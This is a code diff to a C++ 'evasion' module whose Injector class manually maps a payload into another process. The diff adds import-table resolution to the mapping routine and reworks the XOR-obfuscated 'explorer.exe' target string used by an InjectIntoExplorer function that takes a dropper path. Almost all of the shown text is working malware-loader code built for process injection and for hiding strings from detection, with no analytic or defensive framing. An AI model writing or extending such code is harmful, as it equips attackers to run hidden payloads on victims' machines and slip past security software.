@@ -12,9 +12,6 @@
 namespace evasion {
 
 namespace {
-    // "kernel32.dll"
-    std::string kKernel32 = "\x31\x3F\x28\x34\x3F\x36\x69\x68\x74\x3E\x36\x36";
-
     struct RELOC_ENTRY {
         WORD Offset : 12;
         WORD Type : 4;
@@ -66,6 +63,32 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
                 }
                 pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
             }
+        }
+    }
+
+    // 2.5 Resolve IAT
+    auto& importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (importDir.Size > 0) {
+        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pLocalBase + importDir.VirtualAddress);
+        while (pImportDesc->Name != 0) {
+            char* szDllName = (char*)(pLocalBase + pImportDesc->Name);
+            HMODULE hDll = GetModuleHandleA(szDllName);
+            if (!hDll) hDll = LoadLibraryA(szDllName);
+            if (hDll) {
+                PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pLocalBase + pImportDesc->FirstThunk);
+                PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)(pLocalBase + (pImportDesc->OriginalFirstThunk ? pImportDesc->OriginalFirstThunk : pImportDesc->FirstThunk));
+                while (pThunk->u1.AddressOfData != 0) {
+                    if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal)) {
+                        pThunk->u1.Function = (DWORD_PTR)GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
+                    } else {
+                        PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pLocalBase + pOriginalThunk->u1.AddressOfData);
+                        pThunk->u1.Function = (DWORD_PTR)GetProcAddress(hDll, (LPCSTR)pImportByName->Name);
+                    }
+                    pThunk++;
+                    pOriginalThunk++;
+                }
+            }
+            pImportDesc++;
         }
     }
 
@@ -171,7 +194,7 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
 
 bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
     (void)dropperPath;
-    const wchar_t kExplorerEnc[] = { 0x3F, 0x22, 0x2A, 0x36, 0x35, 0x28, 0x3F, 0x28, 0x74, 0x3F, 0x22, 0x3F }; // explorer.exe
+    const wchar_t kExplorerEnc[] = { 'e'^0x5A, 'x'^0x5A, 'p'^0x5A, 'l'^0x5A, 'o'^0x5A, 'r'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // explorer.exe
     std::wstring explorer = utils::DecryptW(kExplorerEnc, 12);
     DWORD pid = GetProcessIdByName(explorer);
     if (pid == 0) {
